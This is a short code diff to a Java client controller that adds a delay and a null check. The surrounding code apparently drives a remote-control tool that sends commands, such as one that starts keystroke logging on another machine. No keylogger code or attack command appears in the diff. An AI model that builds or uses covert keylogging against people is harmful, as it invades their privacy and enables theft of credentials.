@@ -214,6 +214,11 @@ public class ClientController {
             Thread newThread = new Thread(() -> {
                 send.setSubject(key+ " "+ number);
                 send.sendContent("6");
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    throw new RuntimeException(e);
+                }
                 Platform.runLater(() -> {
                     buttonLogTurnOff.setDisable(false);
                     text_keylog.setText("Start get keylog!");
@@ -664,7 +669,9 @@ public class ClientController {
     }
     public void OnButtonResGet(ActionEvent event){
         Addresslist.clear();
+        if (AddresslistOld!=null){
         AddresslistOld.clear();
+        }
         path=" ";
         Platform.runLater(()->{
             buttonBackAddress.setDisable(true);
